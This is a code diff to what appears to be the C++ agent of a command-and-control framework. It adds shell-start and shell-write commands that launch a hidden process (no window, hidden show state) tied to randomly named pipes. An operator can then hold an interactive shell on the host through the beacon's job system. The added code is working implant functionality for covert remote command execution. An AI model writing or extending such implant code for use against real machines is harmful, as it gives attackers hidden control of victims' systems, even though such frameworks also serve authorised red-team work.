@@ -101,6 +101,12 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_RM:
 			this->CmdRm(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_SHELL_START:
+			this->CmdShellStart(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_SHELL_WRITE:
+			this->CmdShellWrite(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_TERMINATE: 
 			this->CmdTerminate(CommandId, inPacker, outPacker); break;
 		
@@ -783,7 +789,6 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 
 	BOOL result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
-
 	if (result) {
 		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
 
@@ -860,6 +865,90 @@ void Commander::CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	else {
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
+	}
+}
+
+void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG shellId = inPacker->Unpack32();
+	ULONG progArgsSize = 0;
+	CHAR* progArgs = (CHAR*)inPacker->UnpackBytes(&progArgsSize);
+	ULONG taskId = inPacker->Unpack32();
+
+	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFOA        spi = { 0 };
+	spi.cb = sizeof(STARTUPINFOA);
+	spi.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	spi.wShowWindow = SW_HIDE;
+
+	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+
+	ULONG r1 = GenerateRandom32();
+
+	CHAR* pipeName = (CHAR*) MemAllocLocal(18);
+	ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);
+
+	HANDLE beaconOutPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
+	HANDLE shellOutPipe  = ApiWin->CreateFileA(pipeName, FILE_WRITE_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+
+	r1 = GenerateRandom32();
+	ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);
+
+	HANDLE beaconInPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
+	HANDLE shellInPipe  = ApiWin->CreateFileA(pipeName, FILE_READ_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+
+	MemFreeLocal((LPVOID*) &pipeName, 18);
+
+	spi.hStdInput  = shellInPipe;
+	spi.hStdOutput = shellOutPipe;
+	spi.hStdError  = shellOutPipe;
+
+	BOOL result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+
+	ApiNt->NtClose(shellOutPipe);
+	ApiNt->NtClose(shellInPipe);
+
+	if (result) {
+
+		JobData job = agent->jober->CreateJobData(shellId, JOB_TYPE_SHELL, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, beaconOutPipe, beaconInPipe);
+
+		outPacker->Pack32(shellId);
+		outPacker->Pack32(COMMAND_JOB);
+		outPacker->Pack8(JOB_TYPE_SHELL);
+		outPacker->Pack8(JOB_STATE_STARTING);
+	}
+	else {
+		if (beaconOutPipe) {
+			ApiNt->NtClose(beaconOutPipe);
+			beaconOutPipe = NULL;
+		}
+
+		if (beaconInPipe) {
+			ApiNt->NtClose(beaconInPipe);
+			beaconInPipe = NULL;
+		}
+
+		outPacker->Pack32(shellId);
+		outPacker->Pack32(COMMAND_JOB);
+		outPacker->Pack8(JOB_TYPE_SHELL);
+		outPacker->Pack8(JOB_STATE_FINISHED);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
+}
+
+void Commander::CmdShellWrite(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG jobId = inPacker->Unpack32();
+	ULONG dataSize = 0;
+	CHAR* data = (CHAR*)inPacker->UnpackBytes(&dataSize);
+	ULONG taskId = inPacker->Unpack32();
+
+	for (int i = 0; i < agent->jober->jobs.size(); i++) {
+		if (jobId == agent->jober->jobs[i].jobId && agent->jober->jobs[i].jobState == JOB_STATE_RUNNING && agent->jober->jobs[i].pipeWrite) {
+			DWORD written = 0;
+			ApiWin->WriteFile(agent->jober->jobs[i].pipeWrite, data, dataSize, &written, NULL);
+			break;
+		}
 	}
 }
 
